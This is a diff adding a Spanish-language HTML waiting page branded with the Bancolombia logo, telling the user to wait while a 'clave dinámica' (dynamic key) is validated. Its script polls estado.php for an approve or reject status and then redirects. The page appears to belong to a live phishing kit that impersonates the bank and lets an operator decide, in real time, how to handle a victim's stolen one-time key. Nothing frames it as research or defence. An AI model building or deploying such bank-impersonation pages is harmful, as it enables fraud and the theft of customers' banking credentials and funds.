@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Validando</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #ffffff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .logo-container {
+      padding: 20px;
+      position: absolute;
+      top: 0;
+      left: 0;
+    }
+
+    .logo-container img {
+      height: 20px;
+    }
+
+    .loader-container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .loader {
+      text-align: center;
+    }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid #ccc;
+      border-top: 6px solid #000;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px auto;
+    }
+
+    .loader-text {
+      font-weight: bold;
+      font-size: 18px;
+      color: #000;
+    }
+
+    .dots::after {
+      content: '';
+      display: inline-block;
+      width: 1em;
+      text-align: left;
+      animation: dots 3.5s steps(3, end) infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes dots {
+      0% { content: ''; }
+      20% { content: '.'; }
+      70% { content: '..'; }
+      100% { content: '...'; }
+    }
+  </style>
+</head>
+<body>
+  <div class="logo-container">
+    <img src="img/logo.svg" alt="Bancolombia Logo">
+  </div>
+
+  <div class="loader-container">
+    <div class="loader">
+      <div class="spinner"></div>
+      <h2 class="loader-text">Por favor espere mientras validamos la clave dinámica<span class="dots"></span></h2>
+    </div>
+  </div>
+
+  <script>
+    const id = localStorage.getItem('solicitudID');
+
+    async function check() {
+      try {
+        const res = await fetch(`estado.php?id=${id}`);
+        const { status } = await res.json();
+        if (status === 'aprobado') {
+          window.location.href = 'final.html';
+        } else if (status === 'rechazado') {
+          localStorage.setItem('showError', 'true');
+          window.location.href = 'index3.html';
+        }
+      } catch (e) {
+        console.error(e);
+        localStorage.setItem('showError', 'true');
+        window.location.href = 'index3.html';
+      }
+    }
+
+    let attempts = 0;
+    const interval = setInterval(() => {
+      if (attempts++ >= 3) {
+        clearInterval(interval);
+        localStorage.setItem('showError', 'true');
+        window.location.href = 'index3.html';
+      } else {
+        check();
+      }
+    }, 5000);
+  </script>
+</body>
+</html>
